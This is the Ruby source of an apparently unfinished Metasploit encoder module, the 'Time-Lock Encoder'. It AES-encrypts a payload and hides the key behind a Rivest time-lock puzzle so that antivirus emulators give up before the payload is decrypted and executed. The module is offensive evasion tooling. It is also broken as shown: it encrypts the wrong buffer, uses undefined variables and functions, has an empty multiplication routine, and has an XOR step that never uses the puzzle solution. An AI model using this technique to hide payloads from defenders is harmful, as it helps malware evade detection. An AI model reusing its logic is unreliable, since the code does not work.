#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#

require 'msf/core'
require 'openssl'
require 'mathn'

#
# Implements payload encryption that is decrypted at runtime
# after solving a time-lock puzzle to figure out the encryption
# key. This is useful for anti-emulation.
#
class Metasploit3 < Msf::Encoder

  def initialize(info = {})
    super(
      'Name'             => 'Time-Lock Encoder',
      'Description'      => %q{
          Implements payload encryption that is decrypted at runtime
          after solving a time-lock puzzle to figure out the encryption
          key. This is useful for anti-emulation.

          Rivest's square-and-modulus method is used to obfuscate the
          encryption key behind a puzzle that requires a fixed number
          of operations to solve (this is the "time-lock" bit). Once
          solved, the AES key is decoded with the solution (using a
          large XOR key as a one-time-pad) and the payload is decrypted
          and executed.
      },
      'Author'           => 'joev',
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE)

    register_advanced_options([
      Msf::OptInt.new('TOTAL_SQUARES', [ true, "Number of squares required to decrypt (~30k/min is a good estimate).", 150000])
    ])
  end

  # Encrypts the payload and wraps it in a C routine that solves a
  # time-lock puzzle to find the original key
  def encode_payload(buf, reg_offset, protect_payload)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.encrypt

    key    = cipher.random_key
    iv     = cipher.random_iv
    buffer = cipher.update(buf) + cipher.final

    c_routine(buf, key, iv) # todo, invoke metasm and actually compile this :)
  end

  private

  # @param buffer [String] the AES256-encrypted buffer containing the payload
  # @param key [Fixnum] the AES256 CBC key
  # @param iv [Fixnum] the AES256 CBC IV/nonce
  # @return [String] C code that solves a time-lock puzzle to recover +key+ and
  #   then uses +key+ to decrypt the payload in +buffer+
  def c_routine(buffer, key, iv)
    %Q|
      #{aes_c_lib}
      #{time_lock_puzzle(plaintext)}
    |
  end

  # Based on Rivest et. al's paper, "Time-lock puzzles and timed-release Crypto":
  # http://www.hashcash.org/papers/time-lock.pdf
  # http://people.csail.mit.edu/rivest/lcs35-puzzle-description.txt
  #
  # Also useful: "Anti-Emulation Through Time-Lock Puzzles"
  # by Tim Ebringer at The University of Melbourne
  #
  # Relies on the fact that integer squaring is still "hard" (although there is a general
  # lack of proof of this concept, see "Time-lock puzzles and the Oracle Model", additionally
  # see how this falls apart on (theoretical) quantum machines). Because each square/modulus
  # depends on the previous (it is "lossy"), this calculation is impossible to parallelize.
  #
  # @param plaintext [String] the String to hide in the time-lock puzzle.
  #   This will be the key that unlocks the AES-encrypted payload.
  # @return [String] C code that solves a time-lock puzzle to recover +plaintext+
  def time_lock_puzzle(plaintext)
    # We start with two large primes, p and q. They are of length 256 since they
    # will be used to encrypt a separate 256 bit key.
    p = generate_large_prime(256)
    q = generate_large_prime(256)

    # We multiply them to get n, the product of two primes. n is eventually
    # embedded into the puzzle without p or q. However, because we know n's
    # factorization, we are able to very quickly solve the puzzle here.
    # The typical RSA shoopdewoop (still completely unproven).
    n = p * q

    # t is the number of times we will have to square n to decrypt the key
    t = datastore['TOTAL_SQUARES']

    # quickly generate and solve the puzzle using the factorization of n
    phi = (p-1) * (q-1)
    u = 2 ** t % phi
    w = 2 ** u % n

    # we use w to XOR-encrypt the plaintext key. since w is as wide as the key,
    # this works like a one-time-pad, so deal with it.
    encrypted = plaintext.chars.each_with_index.map { |c, i| plaintext[i] ^ c.ord }.join

    # n, t, and encrypted will be rather large integers. since we just need to
    # calculate some squares, we'll turn these into arrays of digits and do the
    # math by hand like a boss.
    %Q|
      void ascii2int(char* x, uint32_t len) {
        for (unsigned int i = 0; i < len; i++) x[i] -= '0';
      }

      unsigned int lt(char* x, char *y, uint32_t len) {
        for (unsigned int i = len-1; i > -1; i--) {
          if (x[i] < y[i]) return 1;
          if (x[i] > y[i]) return 0;
        }
        return 0;
      }

      void mult(char* x, char* y, uint32_t len, uint32_t log_x, uint32_t log_y) {
        // x must be well padded and right aligned
        // we will need a coup
        for (unsigned int i = len-1; i > -1; i--) {

        }
      }

      void inc(char* x, uint32_t len) {
        unsigned int carry = 0;
        unsigned int idx = len-1;

        do {
          x[idx]++;
          if ((carry = x[idx] > 9)) {
            x[idx] = 0;
          }
          idx--;
        } while (carry > 0 && idx >= 0);
      }

      unsigned char* n = "#{n}";
      unsigned char* secret = "#{encrypted}";
      unsigned char* t = "#{t}";
      unsigned char* s = "000000002";

      ascii2int(n, #{n.to_s.length});
      ascii2int(secret, #{secret.to_s.length});
      ascii2int(t, #{t.to_s.length});

      while (lt(i, t)) {
        inc(i);
        square(s);
        modulus(n, t);
      }

      xor(secret, s);

      aes256_context ctx;
      aes256_init(&ctx, secret);
      aes256_decrypt_ecb(&ctx, buf);
      aes256_done(&ctx);

      ((void(*)())payload)();
    |
  end

  # @param bits [Fixnum] the max "width" of the prime in memory
  # @return [Fixnum] a large prime of size +bits+
  def generate_large_prime(bits)
    OpenSSL::BN::generate_prime(bits)
  end

  def aes_c_lib
    ""
  end

end
